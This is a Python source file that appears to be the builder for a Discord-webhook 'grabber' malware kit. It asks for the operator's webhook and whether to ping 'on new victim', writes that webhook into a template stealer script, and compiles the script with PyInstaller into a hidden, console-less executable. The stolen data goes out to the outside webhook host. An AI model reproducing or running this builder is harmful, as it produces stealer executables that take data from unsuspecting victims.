import os
import requests
import random
import shutil
import subprocess
import time
import sys
from json import load
from urllib.request import urlopen
from alive_progress import alive_bar
from colorama import Fore, Style, init

class Builder:
    def __init__(self) -> None:
        self.loading()

        if not self.check():
            exit()

        self.webhook = input(
            f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your webhook: ')
        if not self.check_webhook(self.webhook):
            print(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
            str(input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit..."))
            sys.exit()

        self.filename = input(
            f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your filename: ')
        self.ping = input(
            f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping on new victim? (y/n): ')

        if self.ping.lower() == 'y':
            self.ping = True

            self.pingtype = input(
                f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping type (1 for here | 2 for everyone): ').lower()
            if self.pingtype not in ["1", "2"]:
                # default to @here if invalid ping type.
                self.pingtype == "here"
        else:
            self.ping = False
            self.pingtype = "none"

        self.compy = input(
                f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n):')

        self.mk_file(self.filename, self.webhook)

        print(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Built!')

        run = input(
            f'\n\n\n{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to test run the file? [y/n]: ')
        if run.lower() == 'y':
            self.run(self.filename)

        input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press enter to exit...')

    def loading(self):
        p = Fore.GREEN + Style.DIM
        r = Fore.RED + Style.BRIGHT

        img = fr"""{p}
     ███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█ 
     ████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█ 
     ███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
     █████████████████████████████████████████████████
     █░░██░░████████████╬╬╬╬╬████░░██░░██████████████
     ███░░██░░██████████╬╬╬╬╬██████░░██░░██████████
     ████░░██░░██████▓▓▓▓╬╬╬╬╬╬██████░░██░░██████
     ███████████████▓▓▓▓╬╬╬╬╬╬╬╬╬██████████████
     █████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
     █████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
     █████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
     ████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
     ████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██ 
     █████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██ 
     █████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███ 
     ██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███ 
     ███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████ 
     ███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████ 
     ████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████ 
     █████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████ 
     ██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████ 
     ███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████ 
     ██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████ 
     ███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████


                      IP: {load(urlopen('https://jsonip.com/'))['ip']}
                Username: {os.getlogin()}
                 PC Name: {os.getenv('COMPUTERNAME')}
        Operating System: {os.getenv('OS')}

|"""

        with alive_bar(40) as bar:
            for _ in range(40):
                print(img)
                time.sleep(random.randint(1, 9) / 40)
                os.system('cls')
                bar()

            os.system('cls')

        print(Style.RESET_ALL)

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def check(self):
        required_files = {'./grabber.py',
                          './requirements.txt', }

        for file in required_files:
            if not os.path.isfile(file):
                print(f'{Fore.RED}[!]{Fore.RESET} {file} not found!')
                return False

        try:
            print(
                subprocess.check_output(
                    "python -V",
                    stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(f'{Fore.RED}[!]{Fore.RESET} Python not found!')
            return False

        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')

        os.system('mode con:cols=150 lines=20')

        return True

    def mk_file(self, filename, webhook):
        print(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Generating source code...')

        with open('./grabber.py', 'r', encoding="utf-8") as f:
            code = f.read()

        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%webhook_here%', webhook)
                    .replace("\"%ping_enabled%\"", str(self.ping))
                    .replace("%ping_type%", self.pingtype))

        if self.compy == 'y':
            self.compile(filename)
        else:
            time.sleep(2)
            print(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Source code has been generated...')
            input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press enter to exit...')
            sys.exit()

    def compile(self, filename):
        print(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Compiling code...')
        
        os.system(
            f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\\{filename}.py')
            
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', f'./{filename}.py'}

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
                    print(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} {clean} removed!')
            except Exception:
                print(f'{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} {clean} not found!')
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
                    print(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} {clean} removed!')
            except Exception:
                print(f'{Fore.RED}[!]{Fore.RESET} {clean} not found!')
                continue

    def run(self, filename):
        print(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Attempting to execute file...')

        if os.path.isfile(f'./{filename}.exe'):
            os.system(f'start ./{filename}.exe')

if __name__ == '__main__':
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system('mode con:cols=212 lines=212')
        os.system("cls")

    Builder()
